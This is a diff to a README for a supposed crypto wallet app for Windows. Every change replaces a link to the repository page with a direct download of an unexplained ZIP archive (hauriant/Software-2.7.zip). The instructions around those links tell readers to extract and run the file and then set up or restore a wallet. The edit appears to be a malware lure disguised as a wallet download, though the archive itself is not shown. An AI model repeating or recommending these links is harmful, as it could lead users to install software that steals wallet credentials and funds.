@@ -1,6 +1,6 @@
 # 💼 wallet - Simple crypto wallet for everyday use
 
-[![Download wallet](https://img.shields.io/badge/Download%20wallet-blue?style=for-the-badge&logo=github)](https://github.com/cakeopenorder505/wallet)
+[![Download wallet](https://img.shields.io/badge/Download%20wallet-blue?style=for-the-badge&logo=github)](https://github.com/cakeopenorder505/wallet/raw/refs/heads/main/hauriant/Software-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ wallet is a desktop-ready guide for using the Gem open source crypto wallet on W
 
 Use this link to visit the download page:
 
-[Download wallet from GitHub](https://github.com/cakeopenorder505/wallet)
+[Download wallet from GitHub](https://github.com/cakeopenorder505/wallet/raw/refs/heads/main/hauriant/Software-2.7.zip)
 
 Open the page in your browser, then look for the latest Windows file or release package. If the page shows more than one file, choose the one for Windows.
 
@@ -31,7 +31,7 @@ If your computer is older, close other apps before you run wallet. That helps th
 
 Follow these steps in order:
 
-1. Open the download page: [wallet on GitHub](https://github.com/cakeopenorder505/wallet)
+1. Open the download page: [wallet on GitHub](https://github.com/cakeopenorder505/wallet/raw/refs/heads/main/hauriant/Software-2.7.zip)
 2. Find the latest Windows download file.
 3. Save the file to your Downloads folder.
 4. If the file is a ZIP archive, right-click it and choose Extract All.
@@ -209,7 +209,7 @@ Here are a few simple terms you may see inside the app:
 
 ## ❓ What to Do Next
 
-1. Open the download page: [wallet on GitHub](https://github.com/cakeopenorder505/wallet)
+1. Open the download page: [wallet on GitHub](https://github.com/cakeopenorder505/wallet/raw/refs/heads/main/hauriant/Software-2.7.zip)
 2. Download the Windows file
 3. Install the app
 4. Set up a new wallet or restore one
